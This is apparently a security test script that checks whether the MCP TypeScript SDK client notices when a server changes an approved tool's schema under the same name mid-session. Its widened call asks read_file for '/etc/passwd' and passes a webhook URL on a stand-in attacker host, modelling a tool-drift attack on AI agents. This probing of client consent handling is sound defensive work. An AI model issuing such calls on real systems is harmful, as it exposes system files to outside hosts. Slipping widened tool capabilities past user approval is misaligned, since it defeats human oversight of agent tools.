// Client survey, MCP TypeScript SDK: what does the application see when an approved tool widens mid-session?
// Two configurations: default client, and the opt-in listChanged auto-refresh handler. Prints one JSON line each.
import { Client } from "@modelcontextprotocol/sdk/client/index.js";
import { StdioClientTransport } from "@modelcontextprotocol/sdk/client/stdio.js";
import fs from "node:fs"; import os from "node:os"; import path from "node:path"; import { createRequire } from "node:module";
const require = createRequire(import.meta.url);
const version = JSON.parse(fs.readFileSync(path.join(path.dirname(new URL(import.meta.url).pathname), "node_modules/@modelcontextprotocol/sdk/package.json"), "utf8")).version;
const here = path.dirname(new URL(import.meta.url).pathname);
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

async function run(optIn) {
  const outbox = path.join(os.tmpdir(), `drift_ts_${optIn}_${process.pid}.jsonl`);
  const events = [];
  const opts = optIn ? { listChanged: { tools: { onChanged: (err, tools) => events.push({ err: err ? String(err) : null, n: tools ? tools.length : 0 }) } } } : {};
  const client = new Client({ name: "survey", version: "1" }, opts);
  const transport = new StdioClientTransport({ command: "python3", args: [path.join(here, "drift_server.py")],
    env: { ...process.env, DRIFT_OUTBOX: outbox } });
  await client.connect(transport);
  const s1 = (await client.listTools()).tools.find((t) => t.name === "read_file").inputSchema;
  await client.callTool({ name: "admin_upgrade", arguments: {} });
  await sleep(800);
  const s2 = (await client.listTools()).tools.find((t) => t.name === "read_file").inputSchema;
  let err = null, reply = "";
  try {
    const r = await client.callTool({ name: "read_file", arguments: { path: "/etc/passwd", webhookUrl: "https://attacker.example/x" } });
    reply = (r.content && r.content[0] && r.content[0].text) || "";
  } catch (e) { err = String(e); }
  await client.close();
  const calls = fs.existsSync(outbox) ? fs.readFileSync(outbox, "utf8").trim().split("\n").map((l) => JSON.parse(l)) : [];
  return { client: "@modelcontextprotocol/sdk", version, configuration: optIn ? "listChanged.tools.onChanged (opt-in)" : "default",
    schema_changed_under_same_name: JSON.stringify(s1) !== JSON.stringify(s2),
    onChanged_callbacks: events, sdk_diff_or_approval_api: "none (consent is left to the host application)",
    widened_call_reached_server: calls.some((c) => c.name === "read_file" && c.arguments && c.arguments.path === "/etc/passwd"),
    sdk_error_on_widened_call: err, server_reply: reply.slice(0, 60) };
}
for (const optIn of [false, true]) console.log(JSON.stringify(await run(optIn)));
